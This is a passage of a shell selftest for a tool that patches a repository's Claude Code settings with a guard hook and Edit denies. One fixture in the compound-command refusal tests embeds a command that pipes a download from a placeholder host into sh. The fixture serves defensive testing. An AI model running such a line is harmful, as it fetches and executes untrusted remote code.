  [ "$_wr" -eq 0 ] && return 0
  if [ "$_wr" -eq 4 ]; then rm -f "$OUTREAL"; die1 "could not write the patch to --out; the partial file was removed"; fi
  die2 "could not create --out without overwriting (it appeared meanwhile, or is not writable); nothing was written"
}
report() {
  printf '%s\n' "Patch written: $OUTREAL"
  case "$SET_STATE" in
    new) printf '%s\n' "  .claude/settings.json: new file holding the guard hook and the three Edit denies" ;;
    changed) printf '%s\n' "  .claude/settings.json: your document plus the guard hook and any missing Edit denies; every other key and hook is kept" ;;
  esac
  for _g in $GUARD_WRITE; do printf '%s\n' "  .claude/hooks/$_g: the kit's copy, mode 755, sha256 $(sha256 "$ROOT/.claude/hooks/$_g")"; done
  [ -z "$GI_MISSING" ] || printf '%s\n' "  .gitignore: appends a comment line, then $(printf '%s' "$GI_MISSING" | tr '\n' ' ')"
  for _f in $EC_WRITE; do
    case "$(cat "$T/ec/$_f.kind")" in
      new) printf '%s\n' "  $_f: new file holding the kit's entry contract" ;;
      insert) printf '%s\n' "  $_f: the kit's entry contract goes in at the top, after a leading title line; your content follows it" ;;
      replace) printf '%s\n' "  $_f: everything from your old entry-contract heading up to the next '## ' heading is replaced by the kit's; the lines above it and from that next heading on are unchanged" ;;
      close) printf '%s\n' "  $_f: the kit's closing heading is added after your entry contract, which is already the kit's" ;;
    esac
  done
  [ -z "$EC_WRITE" ] || printf '%s\n' "  owed to you, never filled by the patch: the project header fields **Project:**, **Intent owner:**, the backlog backend and the target harnesses (docs/adoption/brownfield.md, section 3)"
  [ "$REFORMAT" -eq 0 ] || printf '%s\n' "  note: your settings.json was not in two-space layout, so the patch also reformats the whole file"
  if [ "$SET_STATE" != none ]; then
    _en=""
    if jq -e 'has("env")' "$T/old.json" >/dev/null 2>&1; then _en=", including its env values"; fi
    printf '%s\n' "This patch contains your settings.json and its values$_en. Read it yourself; an agent should not read it."
  fi
  printf '%s\n' "Next, you:" "  1. Read the patch." "  2. At the repository root: git apply '$OUTREAL'" "  3. sh conformance/guard-wired.sh" \
    "  4. Install the pre-push hook yourself (docs/adoption/brownfield.md, section 2 step 5); it stays a human act."
}

# --- the selftest: cells A1-A8 of the design (A7 is the entry-contract region, errata E1) and their mutants ---
SELFTEST_BAD=0; SELFTEST_QUIET=0; SEQ=0; OUT=""; RC=0; ARUN_TMP=""
chk() {  # <0 ok | 1 bad> <message>
  if [ "$1" -eq 0 ]; then
    [ "$SELFTEST_QUIET" -eq 1 ] || echo "PASS: $2"
  else
    SELFTEST_BAD=$((SELFTEST_BAD + 1))
    [ "$SELFTEST_QUIET" -eq 1 ] || echo "FAIL: $2"
  fi
}
has() { case "$OUT" in *"$1"*) chk 0 "$2" ;; *) chk 1 "$2 (missing: $1)" ;; esac; }
hasnt() { case "$OUT" in *"$1"*) chk 1 "$2 (found: $1)" ;; *) chk 0 "$2" ;; esac; }
show_out() { [ "$SELFTEST_QUIET" -eq 1 ] || printf '%s\n' "$OUT" | head -n 15 | tr -d '\000-\010\013-\037\177' | sed 's/^/    | /'; }
rc_is() { if [ "$RC" -eq "$1" ]; then chk 0 "$2"; else chk 1 "$2 (rc $RC, wanted $1)"; show_out; fi; }
g() { git -c user.name=adopt-selftest -c user.email=adopt-selftest@invalid -c commit.gpgsign=false -c init.defaultBranch=main -c core.hooksPath=/dev/null "$@"; }
exists() { if [ -e "$1" ]; then chk 0 "$2"; else chk 1 "$2 (absent: $1)"; fi; }
absent() { if [ -e "$1" ]; then chk 1 "$2 (present: $1)"; else chk 0 "$2"; fi; }
file_has() { if grep -qF -- "$2" "$1" 2>/dev/null; then chk 0 "$3"; else chk 1 "$3 (missing: $2)"; fi; }

mk_kit() { SEQ=$((SEQ + 1)); KITDIR="$W/kit$SEQ"; cp -Rp "$KIT0" "$KITDIR"; }
mk_repo() {  # -> TGT (a committed repository), OUTD (an empty directory for --out), P (the patch path in it)
  SEQ=$((SEQ + 1)); TGT="$W/t$SEQ"; OUTD="$W/o$SEQ"; P="$OUTD/p.patch"; mkdir -p "$TGT" "$OUTD"
  g init -q "$TGT"; printf 'EXAMPLE_VALUE\n' > "$TGT/README.md"
  g -C "$TGT" add -A; g -C "$TGT" commit -qm base
}
commit_all() { g -C "$1" add -A -f; g -C "$1" commit -qm "$2"; }
arun() {  # <kit> args... -> OUT, RC, in a scrubbed env: a settled HOME, no ambient git config, a placeholder token, gh and curl stubs first on PATH
  _ak=$1; shift
  OUT=$(env -u CI -u GITHUB_ACTIONS -u GIT_DIR -u GIT_WORK_TREE -u GIT_INDEX_FILE HOME="$W/home" GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null GH_TOKEN=EXAMPLE_TOKEN_PLACEHOLDER PATH="$W/stubs:$PATH" ${ARUN_TMP:+"TMPDIR=$ARUN_TMP"} sh "$_ak/scripts/adopt.sh" "$@" 2>&1) && RC=0 || RC=$?
}
snap() {  # every file's checksum, every directory and link, and git's view of the tree, ignored files included (.git itself is left out)
  ( cd "$1" && find . -path ./.git -prune -o -type f -print | LC_ALL=C sort | while IFS= read -r _sf; do cksum "$_sf"; done
    find . -path ./.git -prune -o \( -type d -o -type l \) -print | LC_ALL=C sort
    g status --porcelain --ignored )
}
refused() {  # <label> <needle>: the last run exited 2, named its cause and wrote no file
  rc_is 2 "$1 exits 2"
  [ -z "$2" ] || has "$2" "$1 names its cause"
  absent "$P" "$1 wrote no file"
}
mk_kit_settings() {  # <file>: the fixture kit's own settings, synthetic, with two extra Edit entries that must never reach a patch
  jq -n --arg c "$CANON" --arg m "$KMATCH" '{permissions: {deny: ["Edit(/.claude/**)", "Edit(/hooks/**)", "Edit(/.kit/**)", "Edit(/.git/hooks/**)", "Edit(/EXAMPLE_VALUE/**)"]},
    hooks: {PreToolUse: [{matcher: $m, hooks: [{type: "command", command: $c}]}]}}' > "$1"
}

cell_a1() {  # a single mode-600 patch outside the target; nothing inside the target changes
  mk_repo; mkdir -p "$TGT/EXAMPLE_DIR"; printf 'EXAMPLE_VALUE\n' > "$TGT/EXAMPLE_DIR/untracked.txt"
  printf 'ignored/\n' > "$TGT/.gitignore"; commit_all "$TGT" ign; mkdir -p "$TGT/ignored"; printf 'EXAMPLE_VALUE\n' > "$TGT/ignored/f.txt"
  snap "$TGT" > "$W/snap.before"
  arun "$1" "$TGT" --out "$P"
  rc_is 0 "A1 the verb exits 0"
  has "Patch written: " "A1 the output names the patch path"
  has "/p.patch" "A1 the named path is the one asked for"
  snap "$TGT" > "$W/snap.after"
  if cmp -s "$W/snap.before" "$W/snap.after"; then chk 0 "A1 the target is byte-for-byte unchanged (tracked, untracked and ignored)"; else chk 1 "A1 the target is byte-for-byte unchanged (tracked, untracked and ignored)"; fi
  if [ "$(ls -A "$OUTD" | wc -l | tr -d ' ')" = 1 ]; then chk 0 "A1 exactly one file exists at --out"; else chk 1 "A1 exactly one file exists at --out"; fi
  if [ "$(ls -ld "$P" 2>/dev/null | cut -c1-10)" = "-rw-------" ]; then chk 0 "A1 the patch is mode 600"; else chk 1 "A1 the patch is mode 600"; fi
  if g -C "$TGT" apply --whitespace=nowarn --check "$P" >/dev/null 2>&1; then chk 0 "A1 git apply --check takes the patch at the repository root"; else chk 1 "A1 git apply --check takes the patch at the repository root"; fi
  file_has "$P" "new file mode 100755" "A1 the guard scripts are new files with mode 755"
  file_has "$P" "+.kit-run/" "A1 .gitignore gains .kit-run/"
}

a2_case() {  # <kit> <label> <settings text> <jq -e assertion on the applied settings> [untracked]
  _k=$1; _l=$2; mk_repo; mkdir -p "$TGT/.claude"; printf '%s\n' "$3" > "$TGT/.claude/settings.json"
  [ "${5:-}" = untracked ] || commit_all "$TGT" cfg
  arun "$_k" "$TGT" --out "$P"
  rc_is 0 "A2 $_l: the verb exits 0"
  [ "$RC" -eq 0 ] || return 0
  if g -C "$TGT" apply --whitespace=nowarn "$P" >/dev/null 2>&1; then chk 0 "A2 $_l: git apply takes the patch"; else chk 1 "A2 $_l: git apply takes the patch"; return 0; fi
  _o=$(sh "$_k/conformance/guard-wired.sh" --rung1-only "$TGT" 2>&1) && _r=0 || _r=$?
  case "$_o" in *"WARN:"*) _r=9 ;; esac
  if [ "$_r" -eq 0 ]; then chk 0 "A2 $_l: guard-wired --rung1-only is clean after the apply"; else chk 1 "A2 $_l: guard-wired --rung1-only is clean after the apply"; fi
  if jq -e --arg c "$CANON" --arg m "$KMATCH" "$4" "$TGT/.claude/settings.json" >/dev/null 2>&1; then chk 0 "A2 $_l: the settings are as designed"; else chk 1 "A2 $_l: the settings are as designed"; fi
  if jq -e --arg c "$CANON" 'all(.. | objects | select(has("command")) | .command; . == $c or (test("guard\\.sh") | not))' "$TGT/.claude/settings.json" >/dev/null 2>&1; then chk 0 "A2 $_l: no guard command but the canonical one"; else chk 1 "A2 $_l: no guard command but the canonical one"; fi
}
cell_a2() {
  _g='{"type":"command","command":"sh .claude/hooks/guard.sh"}'; _h='{"type":"command","command":"sh my-hook.sh"}'
  a2_case "$1" "no hooks key" '{"model":"EXAMPLE_VALUE"}' '.model == "EXAMPLE_VALUE" and (.hooks.PreToolUse | length) == 1 and .hooks.PreToolUse[0].matcher == $m and .hooks.PreToolUse[0].hooks[0].command == $c'
  a2_case "$1" "the adopter's own PreToolUse hook" "{\"hooks\":{\"PreToolUse\":[{\"matcher\":\"Bash\",\"hooks\":[$_h]}]}}" '(.hooks.PreToolUse | length) == 2 and .hooks.PreToolUse[0].matcher == "Bash" and .hooks.PreToolUse[0].hooks[0].command == "sh my-hook.sh" and .hooks.PreToolUse[1].matcher == $m'
  a2_case "$1" "a guard entry shared with the adopter's hook under a narrower matcher" "{\"hooks\":{\"PreToolUse\":[{\"matcher\":\"Bash\",\"hooks\":[$_h,$_g]}]}}" '(.hooks.PreToolUse | length) == 2 and .hooks.PreToolUse[0].matcher == "Bash" and (.hooks.PreToolUse[0].hooks | length) == 1 and .hooks.PreToolUse[0].hooks[0].command == "sh my-hook.sh" and .hooks.PreToolUse[1].matcher == $m and .hooks.PreToolUse[1].hooks[0].command == $c'
  a2_case "$1" "an element holding only a guard entry under a non-kit matcher" "{\"hooks\":{\"PreToolUse\":[{\"matcher\":\"Bash\",\"hooks\":[$_g]}]}}" '(.hooks.PreToolUse | length) == 1 and .hooks.PreToolUse[0].matcher == $m and .hooks.PreToolUse[0].hooks[0].command == $c'
  a2_case "$1" "two guard entries" "{\"hooks\":{\"PreToolUse\":[{\"matcher\":\"Bash\",\"hooks\":[$_g]},{\"matcher\":\"Write\",\"hooks\":[{\"type\":\"command\",\"command\":\"sh ./.claude/hooks/guard.sh\"}]}]}}" '(.hooks.PreToolUse | length) == 1 and ([.hooks.PreToolUse[].hooks[] | select(.command == $c)] | length) == 1'
  a2_case "$1" "an old non-canonical command under the kit matcher" "$(jq -nc --arg m "$KMATCH" '{hooks: {PreToolUse: [{matcher: $m, hooks: [{type: "command", command: "sh .claude/hooks/guard.sh"}]}]}}')" '.hooks.PreToolUse[0].hooks[0].command == $c and (.hooks.PreToolUse | length) == 1'
  a2_case "$1" "the usual Claude Code spelling of the guard command" "$(jq -nc '{hooks: {PreToolUse: [{matcher: "Bash", hooks: [{type: "command", command: "sh \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/guard.sh"}]}]}}')" '(.hooks.PreToolUse | length) == 1 and .hooks.PreToolUse[0].matcher == $m and .hooks.PreToolUse[0].hooks[0].command == $c'
  a2_case "$1" "denies partly missing" '{"permissions":{"deny":["Edit(/.claude/**)","Bash(EXAMPLE_VALUE:*)"]}}' '.permissions.deny[0] == "Edit(/.claude/**)" and .permissions.deny[1] == "Bash(EXAMPLE_VALUE:*)" and (.permissions.deny | length) == 4'
  a2_case "$1" "extra keys" '{"env":{"EXAMPLE_NAME":"EXAMPLE_VALUE"},"permissions":{"allow":["Bash(ls:*)"]},"model":"EXAMPLE_VALUE"}' '.env.EXAMPLE_NAME == "EXAMPLE_VALUE" and .model == "EXAMPLE_VALUE" and .permissions.allow[0] == "Bash(ls:*)" and (.permissions.deny | length) == 3'
  a2_case "$1" "a hand-formatted file, untracked" "$(printf '{\n\t"model": "EXAMPLE_VALUE",   "hooks": {}\n}')" '.model == "EXAMPLE_VALUE" and (.hooks.PreToolUse | length) == 1' untracked
  has "reformats the whole file" "A2 a hand-formatted file is disclosed as reformatted"
}

cell_a3() {  # an adopted repository yields no patch; a correct hand-formatted file makes none either
  mk_repo; arun "$1" "$TGT" --out "$P"; rc_is 0 "A3 the first run exits 0"
  g -C "$TGT" apply --whitespace=nowarn "$P" >/dev/null 2>&1 || chk 1 "A3 the first patch applies"
  commit_all "$TGT" adopted; P="$OUTD/second.patch"
  arun "$1" "$TGT" --out "$P"
  rc_is 0 "A3 the re-run exits 0"
  has "already adopted: nothing to patch (guard scripts current, settings wired, .gitignore lines present, entry contract current)" "A3 the re-run says nothing is left to patch"
  absent "$P" "A3 the re-run writes no file"
  mk_repo; mkdir -p "$TGT/.claude/hooks"; put_region "$1" "$TGT/CLAUDE.md"; put_region "$1" "$TGT/AGENTS.md"
  cp "$1/.claude/hooks/guard.sh" "$1/.claude/hooks/guard-core.sh" "$TGT/.claude/hooks/"
  jq -c . "$1/.claude/settings.json" > "$TGT/.claude/settings.json"
  printf '%s\n' ".claude/settings.local.json" ".kit-run/" > "$TGT/.gitignore"; commit_all "$TGT" wired
  arun "$1" "$TGT" --out "$P"
  rc_is 0 "A3 a correctly wired, hand-formatted file: the verb exits 0"
  has "entry contract current" "A3 a correctly wired, hand-formatted file with the current region in both files: nothing to patch"
  absent "$P" "A3 a correctly wired, hand-formatted file: no file"
}

a4_cfg() {  # <kit> <label> <needle> <printf text for settings.json>
  mk_repo; mkdir -p "$TGT/.claude"; printf "$4" > "$TGT/.claude/settings.json"; commit_all "$TGT" cfg
  arun "$1" "$TGT" --out "$P"; refused "A4 $2" "$3"
}
cell_a4g() {  # one cell per strict-gate refusal
  a4_cfg "$1" "invalid JSON" "is not valid JSON" '{'
  a4_cfg "$1" "two documents" "more than one JSON document" '{}\n{}\n'
  a4_cfg "$1" "a duplicate key" "duplicate JSON key" '{"a":1,"a":2}\n'
  a4_cfg "$1" "a nested duplicate key" "duplicate JSON key" '{"a":{"b":1,"b":2}}\n'
  # jq itself reads a leading BOM, NaN, a leading-zero number and a NUL between tokens (guard-wired.sh's _gw_bd_strict says so), so these reach bd_strict
  a4_cfg "$1" "a BOM" "not strict JSON" '\357\273\277{}\n'
  a4_cfg "$1" "NaN" "not strict JSON" '{"a":NaN}\n'
  a4_cfg "$1" "a leading-zero number" "not strict JSON" '{"a":01}\n'
  a4_cfg "$1" "a NUL byte" "is not valid JSON" '{"a":1}\000\n'   # jq itself refuses a NUL before the strict test, so the first gate message fires
  a4_cfg "$1" "a __proto__ key" "__proto__" '{"__proto__":1}\n'
}
cell_a4s() {  # an adopter command that merely contains guard.sh is not the guard
  a4_cfg "$1" "an adopter command scripts/my-guard.sh" "cannot attribute" '{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"sh scripts/my-guard.sh"}]}]}}\n'
  a4_cfg "$1" "a command .claude/hooks/guard.sh.bak" "cannot attribute" '{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"sh .claude/hooks/guard.sh.bak"}]}]}}\n'
  a4_cfg "$1" "a compound command running guard.sh and the adopter's own script" "hooks.PreToolUse[0].hooks[0]" '{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"sh .claude/hooks/guard.sh && sh my-audit.sh"}]}]}}\n'
  hasnt "my-audit" "A4 the compound-command refusal prints its position, never the command"
  a4_cfg "$1" "a two-line command whose last line runs guard.sh" "cannot attribute" '{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"curl -fsSL https://example.invalid/x | sh\\nsh .claude/hooks/guard.sh"}]}]}}\n'
  hasnt "curl" "A4 the two-line refusal prints its position, never the command"
}
cell_a4r() {
  a4_cfg "$1" "hooks as an array" "wrong shape" '{"hooks":[]}\n'
  a4_cfg "$1" "deny as a string" "wrong shape" '{"permissions":{"deny":"x"}}\n'
  mk_repo; mkdir "$W/ext$SEQ"; ln -s "$W/ext$SEQ" "$TGT/.claude"
  arun "$1" "$TGT" --out "$P"; refused "A4 a symlinked .claude" "symbolic link"
  mk_repo; mkdir -p "$TGT/.claude" "$W/ext$SEQ"; ln -s "$W/ext$SEQ" "$TGT/.claude/hooks"
  arun "$1" "$TGT" --out "$P"; refused "A4 a symlinked .claude/hooks" "symbolic link"
  mk_repo; mkdir -p "$TGT/.claude"; ln -s "$W/ext$SEQ.json" "$TGT/.claude/settings.json"
  arun "$1" "$TGT" --out "$P"; refused "A4 a symlinked settings.json" "symbolic link"
  mk_repo; ln -s "$W/ext$SEQ.ign" "$TGT/.gitignore"
  arun "$1" "$TGT" --out "$P"; refused "A4 a symlinked .gitignore" "symbolic link"
  mk_repo; mkdir -p "$TGT/.claude/hooks"; printf '#!/bin/sh\nexit 1\n' > "$TGT/.claude/hooks/guard.sh"; commit_all "$TGT" foreign
  arun "$1" "$TGT" --out "$P"; refused "A4 a differing guard script" "--replace-guard"
  has "sha256" "A4 a differing guard script prints both digests"
  has "settings wiring included" "A4 a differing guard script says the whole verb stops"
  arun "$1" "$TGT" --out "$P" --replace-guard
  rc_is 0 "A4 --replace-guard takes the kit's copy"
  file_has "$P" "new mode 100755" "A4 --replace-guard sets mode 755"
  mk_repo; arun "$1" "$TGT" --out "$TGT/p.patch"
  rc_is 2 "A4 --out inside the target exits 2"; has "must be outside the target repository" "A4 --out inside the target names its cause"; absent "$TGT/p.patch" "A4 --out inside the target wrote no file"
  mk_repo; : > "$P"; arun "$1" "$TGT" --out "$P"
  rc_is 2 "A4 an existing --out exits 2"; has "already exists" "A4 an existing --out names its cause"
  if [ ! -s "$P" ]; then chk 0 "A4 an existing --out is left as it was"; else chk 1 "A4 an existing --out is left as it was"; fi
  mk_repo; arun "$1" "$1" --out "$P"; refused "A4 the target being the kit itself" "the kit itself"
  mk_repo; mkdir -p "$TGT/.claude"; printf '{}\n' > "$TGT/.claude/settings.json"; commit_all "$TGT" cfg; printf '{"model":"EXAMPLE_VALUE"}\n' > "$TGT/.claude/settings.json"
  arun "$1" "$TGT" --out "$P"; refused "A4 a dirty tracked settings.json" "uncommitted change"
  mk_repo; mkdir "$W/plain$SEQ"; arun "$1" "$W/plain$SEQ" --out "$P"; refused "A4 a directory that is not a repository" "not a git work tree"   # assumes the temp dir is outside any repository
  mk_repo; arun "$1" "$TGT" --out "$W/no-such-dir/p.patch"; rc_is 2 "A4 --out in a missing directory exits 2"
}
cell_a4() { cell_a4g "$1"; cell_a4s "$1"; cell_a4r "$1"; }

a5_fault() {  # <kit> <label> <sed script> <needle>: a verb with one fault injected must be refused by its own self-check, by the named refusal (exit 1, no file)
  SEQ=$((SEQ + 1)); _fk="$W/f$SEQ"; cp -Rp "$1" "$_fk"
  apply_sed "A5 fault $2" "$_fk" "$3" || return 0
  mk_repo; arun "$_fk" "$TGT" --out "$P"
  rc_is 1 "A5 $2: exits 1"
  absent "$P" "A5 $2: no file at --out"
  has "$4" "A5 $2: refused by the expected check"
}
cell_a5() {
  a5_fault "$1" "the matcher dropped" '/# FAULT-KIT$/s/matcher: \$m, //' "guard-wired.sh --rung1-only refused"
  a5_fault "$1" "a non-canonical command that only a WARN catches" '/# FAULT-KIT$/s|hooks: [[]{type: "command", command: \$c}[]]|hooks: [{type: "command", command: $c}, {type: "command", command: "sh guard.sh.bak"}]|' "guard-wired.sh warns"
  a5_fault "$1" "a deny dropped (rung 1 does not check them)" '/# FAULT-DENY$/s/\$d[[]]/$d[1:][]/' "lacks one of the three Edit denies"
}

a6_kit() {  # <label> <needle> <file in the kit> <sed|jq> <script>: a kit copy with one wiring source broken is refused
  SEQ=$((SEQ + 1)); _vk="$W/f$SEQ"; cp -Rp "$_k" "$_vk"
  if [ "$4" = sed ]; then sed "$5" "$_vk/$3" > "$_vk/tmp.out"; else jq "$5" "$_vk/$3" > "$_vk/tmp.out"; fi
  cat "$_vk/tmp.out" > "$_vk/$3"; rm -f "$_vk/tmp.out"
  mk_repo; arun "$_vk" "$TGT" --out "$P"; refused "A6 $1" "$2"
}
cell_a6() {
  _k=$1
  _n=$(fence_cmds "$_k/docs/adoption/brownfield.md" | jq -r '.command' | grep -cxF -- "$CANON" || true)
  if [ "$_n" = 2 ]; then chk 0 "A6 the extracted GW_CANON equals the command in both brownfield fences"; else chk 1 "A6 the extracted GW_CANON equals the command in both brownfield fences (saw $_n)"; fi
  mk_repo; arun "$_k" "$TGT" --out "$P"
  rc_is 0 "A6 the verb exits 0"
  g -C "$TGT" apply --whitespace=nowarn "$P" >/dev/null 2>&1 || chk 1 "A6 the patch applies"
  if jq -e --arg c "$CANON" --arg m "$KMATCH" '.hooks.PreToolUse[0].matcher == $m and .hooks.PreToolUse[0].hooks[0].command == $c and .permissions.deny == ["Edit(/.claude/**)", "Edit(/hooks/**)", "Edit(/.kit/**)"]' "$TGT/.claude/settings.json" >/dev/null 2>&1; then
    chk 0 "A6 the command, the matcher and exactly the three named denies come from the kit's files, and no other Edit entry"
  else chk 1 "A6 the command, the matcher and exactly the three named denies come from the kit's files, and no other Edit entry"; fi
  a6_kit "an emptied GW_CANON extraction" "GW_CANON" conformance/guard-wired.sh sed '/^GW_CANON=/d'
  a6_kit "a doubled GW_CANON extraction" "GW_CANON" conformance/guard-wired.sh sed '/^GW_CANON=/p'
  a6_kit "a kit settings file missing a named deny" "Edit denies" .claude/settings.json jq 'del(.permissions.deny[] | select(. == "Edit(/hooks/**)"))'
  a6_kit "a doubled canonical hook element" "PreToolUse" .claude/settings.json jq '.hooks.PreToolUse += .hooks.PreToolUse'
  a6_kit "an empty matcher" "matcher" .claude/settings.json jq '.hooks.PreToolUse[0].matcher = ""'
  a6_kit "a brownfield fence that differs from GW_CANON" "brownfield" docs/adoption/brownfield.md sed 's/the guard hook did not/the GUARD hook did not/'
}

put_region() {  # <kit> <file>: the kit's current region and closing heading, as a project's file would hold them
  { region_of "$1/templates/PROJECT-CLAUDE-TEMPLATE.md"; closing_of "$1/templates/PROJECT-CLAUDE-TEMPLATE.md"; } > "$2"
}
a7_case() {  # <kit> <printf text for CLAUDE.md, or - for none>: a committed repository, then the verb
  mk_repo
  if [ "$2" != "-" ]; then printf "$2" > "$TGT/CLAUDE.md"; commit_all "$TGT" cfg; fi
  arun "$1" "$TGT" --out "$P"
}
a7_apply() {  # <label>: rc 0 and the patch applies to TGT
  rc_is 0 "A7 $1: the verb exits 0"
  [ "$RC" -eq 0 ] || return 1
  if g -C "$TGT" apply --whitespace=nowarn "$P" >/dev/null 2>&1; then return 0; fi
  chk 1 "A7 $1: git apply takes the patch"; return 1
}
a7_sec() {  # <label> <file>: the applied file's first "## " section is the kit's region ($W/a7.reg)
  region_of "$TGT/$2" > "$W/a7.sec"
  if cmp -s "$W/a7.sec" "$W/a7.reg"; then chk 0 "A7 $1: $2 opens with the kit's region"; else chk 1 "A7 $1: $2 opens with the kit's region"; fi
}
a7_line() {  # <label> <file> <line number> <text>
  if [ "$(sed -n "$3p" "$TGT/$2")" = "$4" ]; then chk 0 "A7 $1: line $3 of $2 is as designed"; else chk 1 "A7 $1: line $3 of $2 is as designed"; fi
}
a7_lock() {  # <kit> <label>: the kit's agents-brief.sh, run in the applied target with the adapter manifests, passes its entry-contract leg
  cp -Rp "$1/adapters" "$TGT/adapters"
  _ab=$(cd "$TGT" && sh "$1/conformance/agents-brief.sh" 2>&1) || true
  _ecl=$(ec_leg "$_ab") || _ecl=""
  if ec_graded "$_ecl"; then chk 0 "A7 $2: agents-brief.sh's entry-contract leg passes on the applied tree"; else chk 1 "A7 $2: agents-brief.sh's entry-contract leg passes on the applied tree"; fi
}
a7_tpl() {  # <kit> <label> <sed script> <needle>: a kit whose template yields an empty region or closing heading is refused (exit 2, a plain line)
  SEQ=$((SEQ + 1)); _tk="$W/f$SEQ"; cp -Rp "$1" "$_tk"
  sed "$3" "$_tk/templates/PROJECT-CLAUDE-TEMPLATE.md" > "$_tk/tpl.out"; cat "$_tk/tpl.out" > "$_tk/templates/PROJECT-CLAUDE-TEMPLATE.md"; rm -f "$_tk/tpl.out"
  mk_repo; arun "$_tk" "$TGT" --out "$P"; refused "A7 $2" "$4"
  has "use a fresh kit export" "A7 $2 says what to do next"
}
a7_fault() {  # <kit>: both files given the same wrong region still pass the lock (it compares them with each other); the verb's own byte check must refuse
  SEQ=$((SEQ + 1)); _fk="$W/f$SEQ"; cp -Rp "$1" "$_fk"
  apply_sed "A7 fault the same wrong region in both files" "$_fk" '/# FAULT-REGION$/s,> "\$T/region",| tr e E > "$T/region",' || return 0
  mk_repo; arun "$_fk" "$TGT" --out "$P"
  rc_is 1 "A7 the same wrong region in both files: exits 1"
  absent "$P" "A7 the same wrong region in both files: no file at --out"
  has "does not open with the kit's entry contract byte for byte" "A7 the same wrong region in both files: refused by the byte check"
}
a7_insert() {  # <kit>: a title and prose, no title, both files absent
  a7_case "$1" "# Example Title\n\nExample prose line.\n"
  if a7_apply "insert under a title"; then
    a7_sec "insert under a title" CLAUDE.md; a7_sec "insert under a title" AGENTS.md
    a7_line "insert under a title" CLAUDE.md 1 "# Example Title"
    a7_line "insert under a title" CLAUDE.md 3 "$(sed -n 1p "$W/a7.reg")"
    file_has "$TGT/CLAUDE.md" "$(closing_of "$1/templates/PROJECT-CLAUDE-TEMPLATE.md")" "A7 insert under a title: the closing heading is in"
    if [ "$(tail -n 1 "$TGT/CLAUDE.md")" = "Example prose line." ]; then chk 0 "A7 insert under a title: the prose follows the closing heading"; else chk 1 "A7 insert under a title: the prose follows the closing heading"; fi
    has "  CLAUDE.md: the kit's entry contract goes in at the top" "A7 insert: a plain line for CLAUDE.md"
    has "  AGENTS.md: new file" "A7 insert: a plain line for AGENTS.md"
    has "**Intent owner:**" "A7 insert: the owed header fields are named"
    a7_lock "$1" "insert under a title"
  fi
  a7_case "$1" "Example prose only.\n"
  if a7_apply "insert with no title"; then
    a7_sec "insert with no title" CLAUDE.md
    a7_line "insert with no title" CLAUDE.md 1 "$(sed -n 1p "$W/a7.reg")"
    if [ "$(tail -n 1 "$TGT/CLAUDE.md")" = "Example prose only." ]; then chk 0 "A7 insert with no title: the prose follows the closing heading"; else chk 1 "A7 insert with no title: the prose follows the closing heading"; fi
  fi
  a7_case "$1" "# Example Title"
  if a7_apply "insert into a title-only file with no final newline"; then
    a7_line "a title-only file" CLAUDE.md 1 "# Example Title"
    a7_line "a title-only file" CLAUDE.md 2 ""
    a7_line "a title-only file" CLAUDE.md 3 "$(sed -n 1p "$W/a7.reg")"
  fi
  a7_case "$1" "-"
  if a7_apply "both files absent"; then
    a7_sec "both files absent" CLAUDE.md; a7_sec "both files absent" AGENTS.md
    a7_line "both files absent" AGENTS.md 1 "$(sed -n 1p "$W/a7.reg")"
    a7_lock "$1" "both files absent"
  fi
}
a7_replace() {  # <kit>: an old region is replaced and the heading after it stays
  a7_case "$1" "# Example Title\n\n## 1. Entry contract - EXAMPLE old\n\nExample old body line.\n\n## Example Next Heading\n\nExample project text.\n"
  if a7_apply "replace an old region"; then
    a7_sec "replace an old region" CLAUDE.md
    file_has "$TGT/CLAUDE.md" "## Example Next Heading" "A7 replace: the heading after the old region stays"
    file_has "$TGT/CLAUDE.md" "Example project text." "A7 replace: the project's own text stays"
    file_has "$TGT/CLAUDE.md" "# Example Title" "A7 replace: the title stays"
    if grep -qF "Example old body line." "$TGT/CLAUDE.md"; then chk 1 "A7 replace: the old region is gone"; else chk 0 "A7 replace: the old region is gone"; fi
    has "  CLAUDE.md: everything from your old entry-contract heading up to the next '## ' heading is replaced" "A7 replace: a plain line for CLAUDE.md"
    a7_lock "$1" "replace an old region"
  fi
  a7_case "$1" "# Example Title\n\n## 1. Entry contract - EXAMPLE old\n\nExample old body line.\n\nExample note after.\n"
  if a7_apply "replace an only section"; then
    a7_sec "replace an only section" CLAUDE.md
    file_has "$TGT/CLAUDE.md" "$(closing_of "$1/templates/PROJECT-CLAUDE-TEMPLATE.md")" "A7 replace an only section: the kit's closing heading is added"
    a7_lock "$1" "replace an only section"
  fi
}
a7_wired() {  # <kit>: a committed repository with the guard wired and AGENTS.md holding the current region; the caller writes CLAUDE.md and commits
  mk_repo; mkdir -p "$TGT/.claude/hooks"; put_region "$1" "$TGT/AGENTS.md"
  cp "$1/.claude/hooks/guard.sh" "$1/.claude/hooks/guard-core.sh" "$TGT/.claude/hooks/"
  jq -c . "$1/.claude/settings.json" > "$TGT/.claude/settings.json"
  printf '%s\n' ".claude/settings.local.json" ".kit-run/" > "$TGT/.gitignore"
}
a7_adopted() {  # <kit>: an otherwise adopted repository, so the only thing left to judge is CLAUDE.md
  a7_wired "$1"; put_region "$1" "$TGT/CLAUDE.md"; commit_all "$TGT" wired
  arun "$1" "$TGT" --out "$P"
  rc_is 0 "A7 an adopted repository: the verb exits 0"
  has "entry contract current" "A7 an adopted repository: nothing to patch"
  # an identical region with prose above it must not read as current
  a7_wired "$1"; { printf 'Example prose above.\n\n'; region_of "$1/templates/PROJECT-CLAUDE-TEMPLATE.md"; closing_of "$1/templates/PROJECT-CLAUDE-TEMPLATE.md"; } > "$TGT/CLAUDE.md"; commit_all "$TGT" wired
  arun "$1" "$TGT" --out "$P"; refused "A7 an identical region with prose above it" "prose above its old entry contract"
  hasnt "entry contract current" "A7 an identical region with prose above it is not called current"
  # an identical region closed by a heading that renders empty: agents-brief.sh judges it, so it is refused, never called current
  for _eh in '## <br>' '## <!-- -->'; do
